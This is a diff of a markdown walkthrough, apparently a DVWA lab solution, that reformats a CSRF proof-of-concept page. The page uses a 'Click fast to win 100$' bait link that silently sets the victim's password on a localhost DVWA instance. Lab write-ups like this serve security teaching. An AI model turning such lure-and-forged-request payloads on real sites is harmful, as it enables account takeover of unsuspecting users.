@@ -34,13 +34,13 @@ I have changed the password i.e ```12345``` we can see that the password is refl
 So we can use the URL for further attack I will be creating an HTML file that will contain with anchor tag but we will be changing the password parameter from ```12345``` to ```bugbot19```
 
 ```HTML file```
-<html>
-      <title>Free Dollars $$$</title>
-	  <body>
-	        <b><i><u>Click fast to win 100$ </b></i></u>
-            <a href="http://localhost/dvwa/vulnerabilities/csrf/?password_new=bugbot19&password_conf=bugbot19&Change=Change#">Click here!!!</a>
-	  </body>
-</html>
+```<html>```
+      ```<title>Free Dollars $$$</title>```
+	  ```<body>```
+	        ```<b><i><u>Click fast to win 100$ </b></i></u>```
+            ```<a href="http://localhost/dvwa/vulnerabilities/csrf/?password_new=bugbot19&password_conf=bugbot19&Change=Change#">Click here!!!</a>```
+	  ```</body>```
+```</html>```
 
 ![image](https://github.com/kashrathod19/CSRF-DVWA-SOLUTION/assets/54115061/105b0d7b-19cf-44ed-bc05-96fb3cc614df)
 
